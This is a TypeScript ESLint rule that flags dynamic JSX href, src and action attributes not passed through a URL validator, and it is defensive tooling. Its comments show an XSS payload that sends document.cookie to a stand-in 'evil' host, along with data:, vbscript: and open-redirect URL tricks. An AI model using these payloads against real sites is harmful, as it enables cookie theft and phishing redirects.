/**
 * ============================================================================
 * require-safe-url
 * ============================================================================
 *
 * A non-literal `href`, `src`, `action` or `formAction` must go through a URL
 * validator.
 *
 * ---------------------------------------------------------------------------
 * The hole this closes, which React does NOT close for you
 * ---------------------------------------------------------------------------
 * JSX escapes `{value}` in a text node. It does NOT touch an attribute value:
 *
 *     <a href={user.website}>their site</a>
 *
 * If `user.website` is `javascript:fetch('//evil?c='+document.cookie)`, that is
 * a one-click XSS, stored in your database, triggered by a victim who clicks a
 * perfectly ordinary-looking link. It is one of the most common findings in
 * React code reviews *precisely because* people have learned that "React
 * escapes everything" — which is true of text and false of attributes.
 *
 * ---------------------------------------------------------------------------
 * Why a scheme check and not a blocklist
 * ---------------------------------------------------------------------------
 * `javascript:` is the obvious one. `data:text/html,<script>` works too, and
 * `vbscript:` still works in some embedded browsers. Beyond schemes,
 * `//evil.example` LOOKS relative and is treated as absolute, and
 * `https://trusted.example@evil.example/` is read by the browser as
 * `evil.example` while a naive `startsWith('https://trusted')` check reads it
 * as trusted.
 *
 * A validator that allowlists schemes handles all of those at once. A blocklist
 * handles the ones somebody remembered.
 *
 * ---------------------------------------------------------------------------
 * False positives are expected, and cheap
 * ---------------------------------------------------------------------------
 * `<img src={logo} />` where `logo` is a bundler import is safe, and this rule
 * will flag it. Wrapping it costs nothing, and the alternative — teaching a
 * syntax-only rule to tell an import from an API response — is not possible.
 */

import type { Rule } from 'eslint';
import type { Node } from 'estree';
import { createRule, docs, isStaticString, calleeName, lastSegment, type WardenRule } from '../shared.js';

const URL_ATTRIBUTES = new Set(['href', 'src', 'action', 'formAction', 'poster', 'srcDoc']);

export const requireSafeUrl: WardenRule = createRule(
  {
    type: 'problem',
    docs: {
      description: 'Require dynamic href/src/action values to pass through a URL validator.',
      url: docs('require-safe-url'),
      /**
       * `javascript:` and `data:text/html,` in an href are script execution;
       * `//evil.example` and `https://ok@evil.example` are open redirects. JSX
       * escapes text but not attributes, so nothing upstream catches these.
       *
       * This is the noisiest rule here, and it is still `required`, because
       * noise is an ADOPTION cost and not a severity — collapsing the two axes
       * is exactly how `warn` gets chosen for a rule that guards script
       * execution. A codebase that cannot take the volume today adopts by
       * SCOPING the config to the directories it has cleaned, which is visible
       * in the config file, rather than by lowering severity, which is visible
       * nowhere.
       */
      tier: 'required',
    },
    schema: [
      {
        type: 'object',
        properties: {
          /** Functions that count as validating. Yours may be named differently. */
          validators: { type: 'array', items: { type: 'string' }, minItems: 1 },
          /** Extra attributes to treat as URL sinks. */
          extraAttributes: { type: 'array', items: { type: 'string' } },
        },
        additionalProperties: false,
      },
    ],
    messages: {
      unchecked:
        '`{{attribute}}` is built from a dynamic value. JSX escapes text but NOT attributes, so `javascript:…`, `data:text/html,…`, `//evil.example` and `https://ok@evil.example` all reach the browser intact. Wrap it: {{attribute}}={ {{validator}}(value) ?? "#" }.',
    },
  },
  (context) => {
    const options = (context.options[0] ?? {}) as { validators?: string[]; extraAttributes?: string[] };
    const validators = new Set(options.validators ?? ['safeUrl']);
    const attributes = new Set([...URL_ATTRIBUTES, ...(options.extraAttributes ?? [])]);
    const primary = options.validators?.[0] ?? 'safeUrl';

    /** Does this expression bottom out in a validator call on every branch? */
    function isValidated(node: Node | null | undefined): boolean {
      if (!node) return false;
      if (isStaticString(node)) return true;

      switch (node.type) {
        case 'CallExpression': {
          const name = calleeName(node);
          return name !== null && validators.has(lastSegment(name));
        }
        // `safeUrl(x) ?? '#'` and `safeUrl(x) || '/'`
        case 'LogicalExpression':
          return isValidated(node.left) && isValidated(node.right);
        // `ok ? safeUrl(a) : '#'` — both branches must be safe.
        case 'ConditionalExpression':
          return isValidated(node.consequent) && isValidated(node.alternate);
        case 'TSNonNullExpression' as never:
        case 'TSAsExpression' as never:
          return isValidated((node as unknown as { expression: Node }).expression);
        default:
          return false;
      }
    }

    return {
      JSXAttribute(node: Rule.Node) {
        const attribute = node as unknown as {
          name?: { type?: string; name?: string };
          value?: { type?: string; expression?: Node };
        };
        if (attribute.name?.type !== 'JSXIdentifier') return;
        const name = attribute.name.name;
        if (name === undefined || !attributes.has(name)) return;

        // A plain string attribute (href="/about") is static and fine.
        if (attribute.value?.type !== 'JSXExpressionContainer') return;

        const expression = attribute.value.expression;
        if (!expression || (expression as unknown as { type: string }).type === 'JSXEmptyExpression') return;
        if (isValidated(expression)) return;

        context.report({ node, messageId: 'unchecked', data: { attribute: name, validator: primary } });
      },
    };
  },
);
